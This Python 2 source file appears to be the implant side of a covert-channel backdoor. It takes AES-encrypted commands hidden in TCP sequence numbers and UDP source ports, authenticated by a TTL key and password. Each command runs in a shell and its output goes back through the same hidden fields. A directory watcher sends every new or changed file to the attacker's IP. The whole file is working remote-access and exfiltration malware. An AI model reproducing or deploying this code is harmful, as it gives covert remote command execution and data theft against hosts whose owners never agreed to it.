#Dependancies
from scapy.all import *
from Crypto.Cipher import AES
from multiprocessing import Process
import uuid
import time
import subprocess
import binascii
import pyinotify
import parseConfig
import time

# Inputs
localIP = parseConfig.localIP
ttlKey = parseConfig.ttlKey
srcPort = parseConfig.srcPort
dstPort = parseConfig.dstPort
key = parseConfig.key
IV = parseConfig.IV
authentication = parseConfig.authentication
clientIP = parseConfig.clientIP
monitorDir = parseConfig.monitorDir
messages = []


#1. Listen for commands from the attacker
def sniffing():
    #TODO:Need to take out host
    sniff(filter="ip", prn=handle)

def handle(packet):
    #TODO: FIX THIS
    if(packet[IP].src != localIP and packet[IP].src != "0.0.0.0" and packet[IP].src != "127.0.0.1"):
        #print packet[IP].src
        if authenticate(packet):
            global clientIP
            clientIP = packet[IP].src
            payload = decrypt(packet["Raw"].load).split("\n")
            # print "Payload"
            # print payload
            UID = payload[1]
            # print "UID is " + UID
            position = payload[2].split(":")[0]
            # print "Position is " + position
            total = payload[2].split(":")[1]
            # print "Total is " + total
            if(packet.haslayer(TCP)):
                #Define the length
                length = 32
                # decrypt the covert contents
                # print "Covert content = " + str(packet[TCP].seq)
                # convert to binary
                field = packet[TCP].seq
                #Converts the bits to the nearest divisible by 8
                covertContent = lengthChecker("TCP",field)
                # print "binary is " + covertContent
            elif(packet.haslayer(UDP)):
                length = 16
                # decrypt the covert contents
                # print "Covert content = " + str(packet[UDP].sport)
                # convert to binary
                field = packet[UDP].sport
                covertContent = lengthChecker("UDP",field)
                # print "binary is " + covertContent
            # If there is only 1 message for this command, reconstruct it
            #if(total == 1):
                #DEBUG: print "Only one message, just reconstruct it"
            # Else, add to an array
            if(total != 1):
                #DEBUG: print "Multipart command, add to messages"
                addToMessages(messages, UID, total, covertContent)
                # After every add, check if the max has been reached
                if(checkCommands(UID)):
                    #DEBUG: print "Max reached, reconstruct command"
                    command = reconstructCommand(UID)
                    command = decrypt(command)
                    #decryptedCommand = decrypt(command)
                    # print "DECRYPT " + decryptedCommand
                    #Delete that command from the list
                    deleteCommand(UID)
                    result = runCommand(command)
                    encryptedResult = encrypt(result)
                    #print "Result is " + result
                    #threaad.sleep(5)
                    sendmessage("TCP",encryptedResult,"command")
                    #Run the command
                # else:
                    #DEBUG: print "Max not reached, don't reconstruct command yet"

def lengthChecker(type,field):
    covertContent = 0
    seqContent = bin(field)[2:]
    if (type == "TCP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        elif len(seqContent) > 16 and len(seqContent) < 24:
            covertContent = bin(field)[2:].zfill(24)
        elif len(seqContent) > 24 and len(seqContent) < 32:
            covertContent = bin(field)[2:].zfill(32)
        else:
            return seqContent
    elif(type == "UDP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        else:
            return seqContent
    return covertContent

def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # print "Packet payload " + decryptedData
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        # print "Password: " + password
        if(password == authentication):
            return True
        else:
            return False
    return False


def addToMessages(messages, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(messages) == 0):
        #print 'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)
    # If the messages array is NOT empty, search by UID
    else:
        #PsuedoCode
        #Check the current list of messages
        # if there is already some messages witht he same UID
        # then append it to that.
        for x in range(len(messages)):
            if(messages[x][0] == UID):
                #print "There is an existing element with same UID"
                messages[x][2].append(covertContent)
                return;
                # print messages
            pass
        # If NONE of the elements have the same UID, create a
        # new entry
        #print "There are no elements with the same UID"
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)


def checkCommands(UID):
    #print "--Checking Commands--"
    #print(messages)
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            #print "ELEMENT = UID"
            total = element[1][0]
            #print "The total amount of messages is " + str(total)
            numMessages = len(element[2])
            #print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
    pass
    return False

def reconstructCommand(UID):
    #print "Reconstructing command"
    for element in messages:
        # print element
        text = ""
        if(element[0] == UID):
            data = element[2]
            #print data
            for value in data:
                text = text + str(value)
                pass
            # print text
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer
            # print "chunks is " + str(chunks)
            for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
            # print chunks
            message = ''.join(chunks)
            return message
        pass

def deleteCommand(UID):
    #print "Deleting command with UID " + str(UID)
    #print "Num of elements is " + str(len(messages));
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            del messages[x]
    pass
    #print "After delete, the lenght is " + str(len(messages))


############################################SENDING BACK###################
def chunkMessage(message,protocol):
    # print "Message is "  + message
    if(protocol == "TCP"):
		length = 32
    elif(protocol == "UDP"):
		length = 16
    # print str(len(message))

    if(len(message) == length ):
        # print "chunkMessage:The length of the message is the same as the max"
        output = []
        output.append(message)
        return message
    elif(len(message) <= length):
        # print "chunkMessage:The length of the message is less than the max so "\
        # "prepend"
        return message.zfill(length)
    elif(len(message) > length):
        # print "chunkMessage: The length is greater than the max, so will be "\
        # "excess"
        #What will be left over after we chunk the length bit chunks
        rounds = len(message) / length
        excess = len(message) % length
        # print "Rounds is " + str(rounds)
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            #print "ROUND:  #" + str(i)
            # print "This is round" + str(i)
            start = i*length #0
            # print "START: " + str(start)
            end = (i*length)+(length - 1) #31
            # print "END: " + str(end)
            output.append(message[start:end+1])
            #print "Appending " + str(message[start:end+1])
            i = i + 1
            # print "END OF ROUND " + str(output)
            # print "LENGTH OF ROUND IS " + str(len(message[start:end+1]))
        #Get the remainder
        if(excess > 0):
            output.append(message[(end+1):(end+1+excess)])
        # print output
        return output

def generateUID():
    uid = uuid.uuid1()
    #print 'Made a UID ' + str(uid)
    return str(uid)

def craftPackets(data,protocol,type):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()
    #print "The number of messages to send is " + str(len(data))
    while (counter < len(data)):
        #print str(data[counter])
        packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID,type))
        counter = counter + 1

    return packets

def craftPacket(data,protocol,position,total,UID,type):
    global clientIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password
    global authentication

    #print "Data is " + str(data)
    if(type == "file"):
        dstPort = 80
    #print "Crafting packet for # " + str(position) + " / " + str(total)
    if(protocol == "TCP"):
        #print "Put Data " + str(int(data,2)) + "into Seq Number"
        packet = IP(dst=clientIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    elif(protocol == "UDP"):
        packet = IP(dst=clientIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(authentication+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet

def sendmessage(protocol,message,type):
    global clientIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
	#1. Encrypt the message
    if(type == "command"):
	#2A. Convert message to ASCII to Bits
        message = messageToBits(message)
    elif(type == "file"):
    #2B. Convert file to bits
        filePath = message
        message = fileToBits(filePath)
    #print "Message is " + message
    #3. Chunk message into the size appropriate for the protocol
    chunks = chunkMessage(message,protocol)
    #print "Chunks are " + str(chunks)
	#4. Craft packets
    packets = craftPackets(chunks,protocol,type)

	#5. Send the packets
    for packet in packets:
        send((packet))
        pass


def runCommand(command):
    command = command.replace("\0", '')
    f = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = f.stdout.read() + f.stderr.read()
    if result == "":
        result = "ERROR or No Output Produced"
    return result

##HELPERS
def decrypt(command):
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

def encrypt(command):
    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = encryptor.encrypt(command)
    return plain

#Conver the message to ascii to bits
def messageToBits(message):
    # print "The message is " + message
    messageData =""
    for c in message:
        #bin(int(messageData))[2:]
        # print "Char code is " + str(ord(c))
        var = bin(ord(c))[2:].zfill(8)
        # print var
        messageData += str(var)
    # print "Message data is " + messageData
    return messageData

def fileToBits(filePath):
    # fileName = str.split("/")
    file = open(filePath, "rb")
    binaryString = ""

    #convert whatever is in the file into bytes
    readFile = bytearray(file.read())
    #Encrypt with CBC
    fileName = filePath.split("/")
    fileName = encrypt(fileName[len(fileName) - 1])
    #craft a header
    header = messageToBits(fileName + "\n");

    binaryString += header
    #Check header length
    #TEST: print("SHOULD BE " + str(len(fileName+"\n")*8) + " IS ACTUALLY : " + str(len(header)))
    #convert bytes into bits
    for bit in readFile:
        binaryString += bin(bit)[2:].zfill(8)
    return binaryString




##############################################################################################################
def fileMonitor():
    watch = pyinotify.IN_CREATE | pyinotify.IN_CLOSE_WRITE | pyinotify.IN_MOVED_TO
    #checks for any new files and modified files
    wm = pyinotify.WatchManager()
    wm.add_watch(monitorDir, watch , change, rec = True, auto_add = True)
    notifier = pyinotify.Notifier(wm)
    notifier.loop()

def change(ev):
    fileName = ev.name
    filePath = ev.pathname
    if os.path.isfile(filePath) == True:
        sendmessage("UDP", filePath, "file")
    elif os.path.isdir(filePath) == True:
        pass

if __name__ == "__main__":
    commandSniffProcess = Process(target=sniffing)
    commandSniffProcess.start()
    monitorProcess = Process(target=fileMonitor)
    monitorProcess.start()
    commandSniffProcess.join()
    monitorProcess.join()
